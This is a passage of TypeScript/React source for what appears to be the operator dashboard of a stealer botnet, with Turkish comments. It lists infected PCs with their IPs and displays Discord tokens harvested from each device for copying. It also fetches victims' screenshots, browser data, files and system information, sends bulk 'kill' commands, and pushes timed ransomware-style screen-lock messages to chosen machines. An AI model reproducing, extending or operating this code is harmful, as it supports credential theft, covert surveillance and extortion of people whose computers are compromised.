          .filter((t: any) => t.pc_name.toLowerCase() === pcName.toLowerCase())
          .map((t: any) => t.token);
        setActiveTokenModal({ pcName, tokens: matching });
      }
    } catch (err) {
      setActiveTokenModal({ pcName, tokens: [] });
    }
  };

  const handleDeleteBot = async () => {
    if (!selectedBotId) return;
    try {
      const token = localStorage.getItem('token');
      await axios.delete(`${API_BASE_URL}/api/bots/${selectedBotId}`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      triggerToast('Cihaz listeden silindi!');
    } catch (err) {
      // silent
    } finally {
      setSelectedBotId(null);
    }
  };

  const toggleSelectBot = (id: number, e: React.ChangeEvent<HTMLInputElement> | React.MouseEvent) => {
    e.stopPropagation();
    setSelectedBotIds(prev => 
      prev.includes(id) ? prev.filter(item => item !== id) : [...prev, id]
    );
  };

  const handleToggleSelectAll = () => {
    const currentTabBotIds = list.map(b => b.id);
    const allSelected = currentTabBotIds.length > 0 && currentTabBotIds.every(id => selectedBotIds.includes(id));
    if (allSelected) {
      setSelectedBotIds(prev => prev.filter(id => !currentTabBotIds.includes(id)));
    } else {
      setSelectedBotIds(prev => Array.from(new Set([...prev, ...currentTabBotIds])));
    }
  };

  const handleBulkKillBots = async () => {
    const selectedBotsList = bots.filter(b => selectedBotIds.includes(b.id));
    if (selectedBotsList.length === 0) return;

    for (const b of selectedBotsList) {
      const payload = {
        title: '',
        message: '',
        type: 'kill',
        duration: 0,
        targetPc: b.pc_name
      };
      socket.emit('trigger_alert', payload);
      try {
        const token = localStorage.getItem('token');
        await axios.post(`${API_BASE_URL}/api/bots/alert`, payload, {
          headers: { Authorization: `Bearer ${token}` }
        });
      } catch (_) {}
    }

    triggerToast(`Toplu Kill Bot komutu (${selectedBotsList.length} cihaza) başarıyla gönderildi!`);
    setSelectedBotIds([]);
  };

  const handleBulkDeleteBots = async () => {
    if (selectedBotIds.length === 0) return;
    const count = selectedBotIds.length;
    try {
      const token = localStorage.getItem('token');
      for (const id of selectedBotIds) {
        await axios.delete(`${API_BASE_URL}/api/bots/${id}`, {
          headers: { Authorization: `Bearer ${token}` }
        });
      }
      triggerToast(`${count} bot başarıyla listeden temizlendi!`);
    } catch (_) {
      triggerToast('Toplu silme işleminde hata oluştu.');
    } finally {
      setSelectedBotIds([]);
      setActiveBulkDeleteModal(false);
    }
  };

  const handleConfirmKillBot = async () => {
    if (!activeKillModal) return;
    const payload = {
      title: '',
      message: '',
      type: 'kill',
      duration: 0,
      targetPc: activeKillModal.pcName
    };

    socket.emit('trigger_alert', payload);
    try {
      const token = localStorage.getItem('token');
      await axios.post(`${API_BASE_URL}/api/bots/alert`, payload, {
        headers: { Authorization: `Bearer ${token}` }
      });
    } catch (_) {}

    const pc = activeKillModal.pcName;
    setActiveKillModal(null);
    triggerToast(`Kill Bot komutu (${pc}) cihazına başarıyla gönderildi!`);
  };

  const handleSendTargetLock = async () => {
    if (!activeLockModal) return;
    let multiplier = 1000;
    if (modalDurationUnit === 'minutes') multiplier = 60 * 1000;
    if (modalDurationUnit === 'days') multiplier = 24 * 60 * 60 * 1000;

    const parsedVal = parseInt(modalDurationValue, 10);
    const finalMs = (isNaN(parsedVal) || parsedVal <= 0 ? 10 : parsedVal) * multiplier;

    const targets = activeLockModal.isBulk && activeLockModal.pcNames && activeLockModal.pcNames.length > 0
      ? activeLockModal.pcNames
      : [activeLockModal.pcName];

    for (const targetPc of targets) {
      const payload = {
        title: modalTitle.trim() || 'BILDIRIM',
        message: modalMessage.trim(),
        type: 'custom',
        duration: finalMs,
        targetPc
      };

      socket.emit('trigger_alert', payload);
      try {
        const token = localStorage.getItem('token');
        await axios.post(`${API_BASE_URL}/api/bots/alert`, payload, {
          headers: { Authorization: `Bearer ${token}` }
        });
      } catch (_) {}
    }

    setModalSent(true);
    setTimeout(() => {
      setModalSent(false);
      const isBulk = activeLockModal?.isBulk;
      const count = targets.length;
      setActiveLockModal(null);
      setModalTitle('');
      setModalMessage('');
      setModalDurationUnit('seconds');
      if (isBulk) {
        setSelectedBotIds([]);
        triggerToast(`Toplu Ekran Kilitleme komutu (${count} cihaza) başarıyla gönderildi!`);
      }
    }, 1200);
  };

  return (
    <div className="bots-container">
      <NetworkBackground />
      {/* SIDEBAR ÇİZGİSİYLE BİRLEŞEN ÜST HEADER BAR */}
      <div className="bots-top-header">
        <div className="bots-nav-tabs">
          <button
            className={`bots-nav-btn ${tab === 'online' ? 'active' : ''}`}
            onClick={() => handleTabChange('online')}
          >
            {t('common.online')} <span className="tab-badge">{onlineBots.length}</span>
          </button>
          <button
            className={`bots-nav-btn ${tab === 'offline' ? 'active' : ''}`}
            onClick={() => handleTabChange('offline')}
          >
            {t('common.offline')} <span className="tab-badge offline-badge">{offlineBots.length}</span>
          </button>
          <div className="bots-nav-info">
            {t('bots.total_bot')} <span className="tab-badge total-badge">{bots.length}</span>
          </div>
        </div>

        {/* TOPLU KOMUTLAR BÖLÜMÜ (SAĞ TARAFTA) */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginLeft: 'auto' }}>
          <button
            className={`bots-select-all-btn ${list.length > 0 && list.every(b => selectedBotIds.includes(b.id)) ? 'active' : ''}`}
            onClick={handleToggleSelectAll}
            title={list.length > 0 && list.every(b => selectedBotIds.includes(b.id)) ? t('bots.deselect_all') : t('bots.select_all')}
          >
            <CheckSquare size={16} />
          </button>

          {selectedBotIds.length > 0 && (
            <div className="bots-bulk-toolbar">
              <span className="bulk-badge">{selectedBotIds.length} {t('sidebar.bots')}</span>
              <button
                className="bulk-action-btn lock-btn"
                onClick={() => {
                  const selectedBotsList = bots.filter(b => selectedBotIds.includes(b.id));
                  if (selectedBotsList.length === 0) return;
                  setActiveLockModal({
                    pcName: `${selectedBotsList.length} ${t('sidebar.bots')}`,
                    isBulk: true,
                    pcNames: selectedBotsList.map(b => b.pc_name)
                  });
                }}
                title={t('bots.bulk_lock')}
              >
                <Skull size={16} />
              </button>
              <button
                className="bulk-action-btn kill-btn"
                onClick={handleBulkKillBots}
                title={t('bots.bulk_kill')}
              >
                <Power size={16} />
              </button>
              <button
                className="bulk-action-btn delete-btn"
                onClick={() => setActiveBulkDeleteModal(true)}
                title={t('bots.bulk_delete')}
              >
                <Trash2 size={16} />
              </button>
              <button
                className="bulk-action-btn"
                onClick={() => setSelectedBotIds([])}
                title={t('bots.cancel_selection')}
              >
                <X size={16} />
              </button>
            </div>
          )}
        </div>
      </div>

      {/* ÖZGÜN ÇERÇEVELİ LOG AKIŞ KUTUSU */}
      <div className="bots-log-wrapper">
        {list.length === 0 ? (
          <div className="bots-empty">{t('bots.no_bots')}</div>
        ) : (
          <div className="bots-log-list">
            {paginatedList.map((b) => (
              <div key={b.id} className="bot-log-card">
                <div className="bot-log-header">
                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
                    <input
                      type="checkbox"
                      className="bot-checkbox-custom"
                      checked={selectedBotIds.includes(b.id)}
                      onChange={(e) => toggleSelectBot(b.id, e)}
                      title={t('bots.select_bot')}
                    />
                    <span className={`status-pill ${b.status === 'online' ? 'online' : 'offline'}`}>
                      {b.status === 'online' ? `● ${t('common.online')}` : `○ ${t('common.offline')}`}
                    </span>
                    <span className={`device-key-text ${privacyMode ? 'privacy-blur' : ''}`}>
                      {b.device_key || `DEV-${b.id}829X`}
                    </span>
                  </div>

                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                    <button
                      className="trash-btn"
                      onClick={() => setActiveLockModal({ pcName: b.pc_name })}
                      title={t('bots.lock_title')}
                    >
                      <Skull size={16} />
                    </button>
                    <button
                      className="trash-btn"
                      onClick={() => handleOpenSysInfoModal(b)}
                      title={t('sysinfo.title')}
                    >
                      <Info size={16} />
                    </button>

                    <button
                      className="trash-btn"
                      onClick={() => handleOpenDeviceTokens(b.pc_name)}
                      title={t('discord.title')}
                    >
                      <DiscordIcon size={16} />
                    </button>
                    <button
                      className="trash-btn"
                      onClick={() => handleOpenBrowserModal(b)}
                      title={t('browser.title')}
                    >
                      <Globe size={16} />
                    </button>
                    <button
                      className="trash-btn"
                      onClick={() => handleOpenFileManagerModal(b)}
                      title={t('filemanager.title')}
                    >
                      <FolderOpen size={16} />
                    </button>
                    <button
                      className="trash-btn screenshot-btn"
                      onClick={() => handleOpenScreenshotModal(b)}
                      title={t('screenshot.title')}
                    >
                      <Camera size={16} />
                    </button>
                    <button
                      className="trash-btn"
                      onClick={() => setActiveKillModal({ pcName: b.pc_name })}
                      title={t('bots.kill_title')}
                    >
                      <Power size={16} />
                    </button>
                    <button
                      className="trash-btn"
                      onClick={() => setSelectedBotId(b.id)}
                      title={t('bots.delete_title')}
                    >
                      <Trash2 size={16} />
                    </button>
                  </div>
                </div>

                <div className="bot-log-details">
                  <div className="log-info-item">
                    <span className="log-label">PC:</span>
                    <span className={`log-value highlight ${privacyMode ? 'privacy-blur' : ''}`}>{b.pc_name}</span>
                  </div>

                  <div className="log-info-item">
                    <span className="log-label">IP:</span>
                    <span className={`log-value mono ${privacyMode ? 'privacy-blur' : ''}`}>{b.ip}</span>
                  </div>

                  <div className="log-info-item">
                    <span className="log-label">OS:</span>
                    <span className="log-value">{b.os_info}</span>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* ELEGANT MINIMALIST SAYFA DEĞİŞTİRME */}
      {totalPages > 1 && (
        <div className="pagination-wrapper">
          <button
            className="pagination-icon-btn"
            disabled={currentPage <= 1}
            onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
            title="Önceki Sayfa"
          >
            <ChevronLeft size={16} />
          </button>
          <span className="pagination-text">
            {currentPage} / {totalPages}
          </span>
          <button
            className="pagination-icon-btn"
            disabled={currentPage >= totalPages}
            onClick={() => setCurrentPage((p) => Math.min(totalPages, p + 1))}
            title="Sonraki Sayfa"
          >
            <ChevronRight size={16} />
          </button>
        </div>
      )}

      {/* SİLME ONAY MODALI */}
      {selectedBotId !== null && (
        <div className="modal-overlay">
          <div className="modal-content" style={{ maxWidth: '440px' }} onClick={(e) => e.stopPropagation()}>
            <div className="modal-header" style={{ justifyContent: 'space-between' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
                <AlertTriangle color="#ffffff" size={20} />
                <h3 style={{ margin: 0 }}>{t('bots.delete_title')}</h3>
              </div>
              <button
                style={{ background: 'none', border: 'none', color: '#fff', cursor: 'pointer', padding: '0.2rem' }}
                onClick={() => setSelectedBotId(null)}
              >
                <X size={20} />
              </button>
            </div>
            <p className="modal-body" style={{ margin: '0.75rem 0 1.25rem 0', color: '#a1a1aa', fontSize: '0.9rem' }}>
              {t('bots.delete_desc')}
            </p>
            <div className="modal-actions">
              <button className="btn-modal-cancel" onClick={() => setSelectedBotId(null)}>
                {t('common.cancel')}
              </button>
              <button className="btn-modal-delete" onClick={handleDeleteBot}>
                {t('common.delete')}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* CİHAZ DISCORD TOKEN POPUP MODALI */}
      {activeTokenModal !== null && (
        <div className="modal-overlay">
          <div className="modal-content" style={{ maxWidth: '560px' }} onClick={(e) => e.stopPropagation()}>
            <div className="modal-header" style={{ justifyContent: 'space-between' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
                <DiscordIcon size={20} />
                <h3 style={{ margin: 0 }}>{t('discord.tokens_title')} — <span className={privacyMode ? 'privacy-blur' : ''}>{activeTokenModal.pcName}</span></h3>
              </div>
              <button
                style={{ background: 'none', border: 'none', color: '#fff', cursor: 'pointer', padding: '0.2rem' }}
                onClick={() => setActiveTokenModal(null)}
              >
                <X size={20} />
              </button>
            </div>

            <div className="modal-body" style={{ margin: 0, padding: '0.75rem 0' }}>
              {activeTokenModal.tokens.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '2rem 0', color: '#71717a' }}>
                  <DiscordIcon size={36} />
                  <p style={{ marginTop: '0.5rem' }}>{t('discord.no_tokens_device')}</p>
                </div>
              ) : (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.65rem' }}>
                  {activeTokenModal.tokens.map((tItem, idx) => (
                    <div 
                      key={idx} 
                      style={{ 
                        background: 'rgba(255, 255, 255, 0.03)', 
                        padding: '0.65rem 0.85rem', 
                        borderRadius: '8px', 
                        border: '1px solid rgba(255, 255, 255, 0.1)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'space-between',
                        gap: '0.75rem'
                      }}
                    >
                      <span 
                        className={privacyMode ? 'privacy-blur' : ''}
                        style={{ 
                          fontFamily: 'monospace', 
                          fontSize: '0.8rem', 
                          color: '#ffffff', 
                          wordBreak: 'break-all',
                          flex: 1
                        }}
                      >
                        {tItem}
                      </span>
                      <button
                        className="token-copy-btn"
                        style={{ flexShrink: 0, padding: '0.3rem 0.65rem', fontSize: '0.75rem' }}
                        onClick={() => {
                          navigator.clipboard.writeText(tItem);
                          setCopiedTokenIndex(idx);
                          setTimeout(() => setCopiedTokenIndex(null), 2000);
                        }}
                      >
                        {copiedTokenIndex === idx ? t('common.copied') : t('common.copy')}
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="modal-actions" style={{ marginTop: '0.5rem' }}>
              <button className="btn-modal-cancel" onClick={() => setActiveTokenModal(null)}>
                {t('common.close')}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* TOPLU SİLME ONAY MODALI */}
      {activeBulkDeleteModal && (
        <div className="modal-overlay">
          <div className="modal-content" style={{ maxWidth: '440px' }} onClick={(e) => e.stopPropagation()}>
            <div className="modal-header" style={{ justifyContent: 'space-between' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
                <AlertTriangle color="#ffffff" size={20} />
                <h3 style={{ margin: 0 }}>{t('bots.bulk_delete_title')}</h3>
              </div>
              <button
                style={{ background: 'none', border: 'none', color: '#fff', cursor: 'pointer', padding: '0.2rem' }}
                onClick={() => setActiveBulkDeleteModal(false)}
              >
                <X size={20} />
              </button>
            </div>
            <p className="modal-body" style={{ margin: '0.75rem 0 1.25rem 0', color: '#a1a1aa', fontSize: '0.9rem' }}>
              {selectedBotIds.length} {t('bots.bulk_delete_desc')}
            </p>
            <div className="modal-actions">
              <button className="btn-modal-cancel" onClick={() => setActiveBulkDeleteModal(false)}>
                {t('common.cancel')}
              </button>
              <button className="btn-modal-delete" onClick={handleBulkDeleteBots}>
                {t('bots.bulk_delete')}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* FLOATING SAĞ ALT BİLDİRİM TOAST (2 SANİYE) */}
      {globalBannerMsg && (
        <div className="bottom-right-toast">
          <Check size={18} color="#22c55e" />
          <span>{globalBannerMsg}</span>
        </div>
      )}

      {/* KILL BOT ONAY POPUP MODALI */}
      {activeKillModal !== null && (
        <div className="modal-overlay">
          <div className="modal-content" style={{ maxWidth: '440px' }} onClick={(e) => e.stopPropagation()}>
            <div className="modal-header" style={{ justifyContent: 'space-between' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
                <Skull color="#ffffff" size={20} />
                <h3 style={{ margin: 0 }}>Kill Bot — <span className={privacyMode ? 'privacy-blur' : ''}>{activeKillModal.pcName}</span></h3>
              </div>
              <button
                style={{ background: 'none', border: 'none', color: '#fff', cursor: 'pointer', padding: '0.2rem' }}
                onClick={() => setActiveKillModal(null)}
              >
                <X size={20} />
              </button>
            </div>
            <p className="modal-body" style={{ margin: '0.75rem 0 1.25rem 0', color: '#a1a1aa', fontSize: '0.9rem' }}>
              {t('bots.kill_desc')}
            </p>
            <div className="modal-actions">
              <button className="btn-modal-cancel" onClick={() => setActiveKillModal(null)}>
                {t('common.cancel')}
              </button>
              <button className="btn-modal-delete" onClick={handleConfirmKillBot}>
                Kill Bot
              </button>
            </div>
          </div>
        </div>
      )}

      {/* CİHAZA ÖZEL EKRAN KİLİT POPUP MODALI */}
      {activeLockModal !== null && (
        <div className="modal-overlay">
          <div className="modal-content" style={{ maxWidth: '500px' }} onClick={(e) => e.stopPropagation()}>
            <div className="modal-header" style={{ justifyContent: 'space-between' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
                <Skull size={20} />
                <h3 style={{ margin: 0 }}>{t('bots.lock_title')} — <span className={privacyMode ? 'privacy-blur' : ''}>{activeLockModal.pcName}</span></h3>
              </div>
              <button
                style={{ background: 'none', border: 'none', color: '#fff', cursor: 'pointer', padding: '0.2rem' }}
                onClick={() => setActiveLockModal(null)}
              >
                <X size={20} />
              </button>
            </div>

            <div className="modal-body sysinfo-modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '0.85rem', margin: '0.5rem 0' }}>
              {modalSent && <div className="rware-info-banner">{t('bots.lock_sent_toast')}</div>}
              <div>
                <label style={{ display: 'block', fontSize: '0.75rem', color: '#a1a1aa', marginBottom: '0.3rem', fontWeight: 500 }}>{t('bots.lock_title_label')}</label>
                <input
                  type="text"
                  className="rware-form-control"
                  value={modalTitle}
                  onChange={(e) => setModalTitle(e.target.value)}
                  placeholder={t('bots.lock_header_placeholder')}
                />
              </div>
              <div>
                <label style={{ display: 'block', fontSize: '0.75rem', color: '#a1a1aa', marginBottom: '0.3rem', fontWeight: 500 }}>{t('bots.lock_msg_label')}</label>
                <input
                  type="text"
                  className="rware-form-control"
                  value={modalMessage}
                  onChange={(e) => setModalMessage(e.target.value)}
                  placeholder={t('bots.lock_msg_placeholder')}
                />
              </div>
              <div>
                <label style={{ display: 'block', fontSize: '0.75rem', color: '#a1a1aa', marginBottom: '0.3rem', fontWeight: 500 }}>{t('bots.lock_duration')}</label>
                <div className="rware-duration-row">
                  <input
                    type="number"
                    className="rware-form-control duration-val"
                    value={modalDurationValue}
                    onChange={(e) => setModalDurationValue(e.target.value)}
                    placeholder="Süre"
                    min="1"
                  />
                  <select
                    className="rware-select"
                    value={modalDurationUnit}
                    onChange={(e) => setModalDurationUnit(e.target.value as any)}
                  >
                    <option value="seconds">{t('bots.seconds')}</option>
                    <option value="minutes">{t('bots.minutes')}</option>
                    <option value="days">{t('bots.days')}</option>
                  </select>
                </div>
              </div>
            </div>

            <div className="modal-actions" style={{ marginTop: '0.5rem' }}>
              <button className="btn-modal-cancel" onClick={() => setActiveLockModal(null)}>
                {t('common.cancel')}
              </button>
              <button
                className="rware-btn studio-capture-btn"
                onClick={handleSendTargetLock}
              >
                <Send size={14} /> {t('common.send')}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* SCREENSHOT STUDIO / INSPECTOR MODAL */}
      {screenshotModal !== null && (
        <div 
          className={`modal-overlay ${screenshotModal.isFullscreen ? 'screenshot-fullscreen-overlay' : ''}`}
        >
          <div
            className={`modal-content screenshot-studio-modal ${screenshotModal.isFullscreen ? 'fullscreen-studio' : ''}`}
            onClick={(e) => e.stopPropagation()}
          >
            {/* STUDIO HEADER */}
            <div className="screenshot-studio-header">
              <div className="studio-header-left">
                <div className="studio-icon-badge">
                  <Camera size={18} />
                </div>
                <div className="studio-title-box">
                  <div className="studio-title-row">
                    <h3 className={`studio-pc-title ${privacyMode ? 'privacy-blur' : ''}`}>{screenshotModal.pcName}</h3>
                    {screenshotModal.history.length > 0 && (
                      <span className="studio-badge count-badge">
                        {screenshotModal.selectedIndex + 1} / {screenshotModal.history.length}
                      </span>
                    )}
                  </div>
                  {screenshotModal.history[screenshotModal.selectedIndex] && (
                    <div className="studio-timestamp">
                      <Clock size={12} /> {screenshotModal.history[screenshotModal.selectedIndex].timestamp}
                    </div>
                  )}
                </div>
              </div>

              <div className="studio-header-controls">
                {/* REFRESH / CAPTURE LIVE */}
                {screenshotModal.botId && (
                  <button
                    className="browser-export-btn fetch-btn"
                    onClick={handleCaptureLive}
                    disabled={screenshotModal.status === 'waiting'}
                    title={t('common.fetch')}
                  >
                    <RefreshCw size={14} className={screenshotModal.status === 'waiting' ? 'spin-icon' : ''} />
                    <span>{screenshotModal.status === 'waiting' ? `${t('common.fetch')}...` : t('common.fetch')}</span>
                  </button>
                )}

                {/* DOWNLOAD */}
                {screenshotModal.imageUrl && (
                  <button className="browser-export-btn" onClick={handleDownloadActiveScreenshot} title={t('screenshot.download')}>
                    <Download size={14} /> <span>{t('screenshot.download')}</span>
                  </button>
                )}

                {/* FULLSCREEN TOGGLE */}
                <button className="studio-ctrl-btn" onClick={handleToggleFullscreen} title={screenshotModal.isFullscreen ? t('screenshot.minimize') : t('screenshot.fullscreen')}>
                  {screenshotModal.isFullscreen ? <Minimize2 size={15} /> : <Maximize2 size={15} />}
                </button>

                {/* CLOSE */}
                <button className="studio-ctrl-btn close-btn" onClick={() => setScreenshotModal(null)} title={t('common.close')}>
                  <X size={17} />
                </button>
              </div>
            </div>

            {/* STUDIO BODY (MAIN STAGE) */}
            <div className="screenshot-studio-body">
              <div className="screenshot-canvas-wrapper">
                {/* PREV ARROW */}
                {screenshotModal.history.length > 1 && (
                  <button className="canvas-nav-btn prev-btn" onClick={handlePrevScreenshot} title={t('screenshot.prev')}>
                    <ChevronLeft size={22} />
                  </button>
                )}

                {/* CANVAS VIEW */}
                <div className="screenshot-canvas-viewport">
                  {screenshotModal.status === 'waiting' && (
                    <div className="studio-loading-box">
                      <div className="screenshot-spinner" />
                    </div>
                  )}

                  {screenshotModal.status === 'error' && (
                    <div className="studio-error-box">
                      <AlertTriangle size={36} color="#ef4444" />
                      <p className="error-main-text">{t('screenshot.error')}</p>
                      <p className="error-sub-text">{t('screenshot.error_desc')}</p>
                    </div>
                  )}

                  {screenshotModal.history.length === 0 && screenshotModal.status !== 'waiting' && (
                    <div className="studio-loading-box">
                      <ImageIcon size={38} color="#71717a" />
                      <p className="loading-main-text">{t('screenshot.no_images')}</p>
                    </div>
                  )}

                  {screenshotModal.imageUrl && (
                    <img
                      src={screenshotModal.imageUrl}
                      alt={`Screenshot ${screenshotModal.selectedIndex + 1}`}
                      className="studio-main-image clickable"
                      onClick={() => setEnlargedPhotoUrl(screenshotModal.imageUrl || null)}
                      title="Fotoğrafı tam ekranda büyütmek için tıklayın"
                    />
                  )}
                </div>

                {/* NEXT ARROW */}
                {screenshotModal.history.length > 1 && (
                  <button className="canvas-nav-btn next-btn" onClick={handleNextScreenshot} title={t('screenshot.next')}>
                    <ChevronRight size={22} />
                  </button>
                )}
              </div>

              {/* FILMSTRIP GALLERY (THUMBNAIL SELECTOR) */}
              {screenshotModal.history.length > 0 && (
                <div className="studio-filmstrip-bar">
                  <div className="filmstrip-label-row">
                    <span className="filmstrip-title">{t('screenshot.gallery')}</span>
                  </div>
                  <div className="filmstrip-scroll">
                    {screenshotModal.history.map((item, idx) => (
                      <div
                        key={idx}
                        className={`filmstrip-card ${idx === screenshotModal.selectedIndex ? 'active' : ''}`}
                        onClick={() => handleSelectScreenshot(idx)}
                        title={item.timestamp}
                      >
                        <img src={item.url} alt={item.filename} className="filmstrip-thumb" />
                        <span className="filmstrip-card-time">{item.timestamp.substring(11, 16)}</span>
                        <button
                          className="filmstrip-card-delete"
                          onClick={(e) => handleDeleteScreenshot(item.filename, e)}
                          title={t('screenshot.delete_image')}
                        >
                          <Trash2 size={12} />
                        </button>
                        {idx === screenshotModal.selectedIndex && <div className="active-dot" />}
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* STUDIO FOOTER */}
            <div className="screenshot-studio-footer">
              <div className="footer-info-left">
                {screenshotModal.history[screenshotModal.selectedIndex] && (
                  <span className="footer-file-name">{screenshotModal.history[screenshotModal.selectedIndex].filename}</span>
                )}
              </div>

              <div className="footer-actions-right">
                <button className="btn-modal-cancel" onClick={() => setScreenshotModal(null)}>
                  {t('common.close')}
                </button>
                {screenshotModal.botId && (
                  <button
                    className="rware-btn studio-capture-btn"
                    onClick={handleCaptureLive}
                    disabled={screenshotModal.status === 'waiting'}
                  >
                    {screenshotModal.status === 'waiting' ? `${t('common.fetch')}...` : t('common.fetch')}
                  </button>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* FULLSCREEN PHOTO LIGHTBOX (FOTOĞRAFI TÜM EKRANA BÜYÜTÜR) */}
      {enlargedPhotoUrl && (
        <div
          className="photo-lightbox-overlay"
          onClick={() => setEnlargedPhotoUrl(null)}
        >
          <button
            className="photo-lightbox-close"
            onClick={() => setEnlargedPhotoUrl(null)}
            title={t('common.close')}
          >
            <X size={24} />
          </button>
          <img
            src={enlargedPhotoUrl}
            alt="Büyük Ekran Görüntüsü"
            className="photo-lightbox-img"
            onClick={(e) => e.stopPropagation()}
          />
        </div>
      )}
      {/* SYSINFO MODAL */}
      {activeSysInfoModal !== null && (
        <div className="modal-overlay">
          <div className="modal-content sysinfo-modal" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header" style={{ justifyContent: 'space-between' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.65rem' }}>
                <div className="studio-icon-badge">
                  <Info size={18} />
                </div>
                <div>
                  <h3 style={{ margin: 0, fontSize: '1rem', color: '#ffffff' }}>{t('sysinfo.title')} — <span className={privacyMode ? 'privacy-blur' : ''}>{activeSysInfoModal.pcName}</span></h3>
                </div>
              </div>

              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                <button
                  className="browser-export-btn fetch-btn"
                  disabled={activeSysInfoModal.loading}
                  onClick={async () => {
                    const bot = bots.find(b => b.id === activeSysInfoModal.botId);
                    if (!bot) return;
                    setActiveSysInfoModal(prev => prev ? { ...prev, loading: true } : prev);
                    try {
                      const token = localStorage.getItem('token');
                      await axios.post(`${API_BASE_URL}/api/bots/sysinfo`, { pcName: bot.pc_name }, {
                        headers: { Authorization: `Bearer ${token}` }
                      });
                      setTimeout(async () => {
                        try {
                          const res = await axios.get(`${API_BASE_URL}/api/bots/sysinfo/${bot.id}`, {
                            headers: { Authorization: `Bearer ${token}` }
                          });
                          if (res.data.success && res.data.sysinfo) {
                            setActiveSysInfoModal(prev => prev ? { ...prev, loading: false, sysinfo: res.data.sysinfo } : prev);
                          } else {
                            setActiveSysInfoModal(prev => prev ? { ...prev, loading: false } : prev);
                          }
                        } catch (_) {
                          setActiveSysInfoModal(prev => prev ? { ...prev, loading: false } : prev);
                        }
                      }, 1200);
                    } catch (_) {
                      setActiveSysInfoModal(prev => prev ? { ...prev, loading: false } : prev);
                    }
                  }}
                  title={t('common.refresh')}
                >
                  <RefreshCw size={14} className={activeSysInfoModal.loading ? 'spin-icon' : ''} /> 
                  <span>{activeSysInfoModal.loading ? t('sysinfo.fetching') : t('common.refresh')}</span>
                </button>

                <button
                  className="studio-ctrl-btn close-btn"
                  onClick={() => setActiveSysInfoModal(null)}
                  title={t('common.close')}
                >
                  <X size={17} />
                </button>
              </div>
            </div>

            <div className="modal-body sysinfo-modal-body" style={{ margin: 0, padding: '0.85rem 0 0 0', flex: 1, overflowY: 'auto' }}>
              {activeSysInfoModal.loading && (
                <div style={{ textAlign: 'center', padding: '3rem 0', color: '#a1a1aa' }}>
                  <div className="screenshot-spinner" />
                  <p style={{ marginTop: '1rem', fontSize: '0.9rem', color: '#ffffff' }}>{t('sysinfo.fetching')}</p>
                </div>
              )}

              {!activeSysInfoModal.loading && !activeSysInfoModal.sysinfo && (
                <div style={{ textAlign: 'center', padding: '3rem 0', color: '#71717a' }}>
                  <AlertTriangle size={36} color="#ffffff" style={{ margin: '0 auto 0.5rem auto', display: 'block', opacity: 0.4 }} />
                  <p style={{ margin: 0, fontWeight: 500 }}>{t('sysinfo.no_data')}</p>
                </div>
              )}

              {!activeSysInfoModal.loading && activeSysInfoModal.sysinfo && (
                <div className="sysinfo-content-wrapper">
                  {/* 2-COLUMN HORIZONTAL GRID (4 BALANCED PANELS) */}
                  <div className="sysinfo-columns-layout">
                    {/* LEFT COLUMN: DONANIM & AĞ */}
                    <div className="sysinfo-column">
                      {/* 1. İŞLEMCİ & DONANIM */}
                      <div className="sysinfo-section expanded">
                        <div className="sysinfo-section-header">
                          <div className="sysinfo-section-title">
                            <Cpu size={15} />
                            <span>{t('sysinfo.hardware')}</span>
                          </div>
                        </div>
                        <div className="sysinfo-section-body">
                          <div className="sysinfo-row">
                            <span className="sysinfo-k">{t('sysinfo.cpu')}</span>
                            <div className="sysinfo-v-box">
                              <span className="sysinfo-v highlight">{activeSysInfoModal.sysinfo.cpu || 'N/A'}</span>
                              {activeSysInfoModal.sysinfo.cpu && (
                                <button className="browser-copy-btn" onClick={() => handleBrowserCopy(activeSysInfoModal.sysinfo!.cpu!, 200001)} title={t('common.copy')}>
                                  {browserCopiedId === 200001 ? <Check size={12} color="#ffffff" /> : <Copy size={12} />}
                                </button>
                              )}
                            </div>
                          </div>
                          <div className="sysinfo-row">
                            <span className="sysinfo-k">{t('sysinfo.cores')}</span>
                            <div className="sysinfo-v-box">
                              <span className="sysinfo-v">{activeSysInfoModal.sysinfo.cpuCores || 'N/A'}</span>
                            </div>
                          </div>
                          <div className="sysinfo-row">
                            <span className="sysinfo-k">{t('sysinfo.gpu')}</span>
                            <div className="sysinfo-v-box">
                              <span className="sysinfo-v highlight">{activeSysInfoModal.sysinfo.gpu || 'N/A'}</span>
                              {activeSysInfoModal.sysinfo.gpu && (
                                <button className="browser-copy-btn" onClick={() => handleBrowserCopy(activeSysInfoModal.sysinfo!.gpu!, 200002)} title={t('common.copy')}>
                                  {browserCopiedId === 200002 ? <Check size={12} color="#ffffff" /> : <Copy size={12} />}
                                </button>
                              )}
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* 2. AĞ & KULLANICI */}
                      <div className="sysinfo-section expanded">
                        <div className="sysinfo-section-header">
                          <div className="sysinfo-section-title">
                            <Wifi size={15} />
                            <span>{t('sysinfo.network')}</span>
                          </div>
                        </div>
                        <div className="sysinfo-section-body">
                          <div className="sysinfo-row">
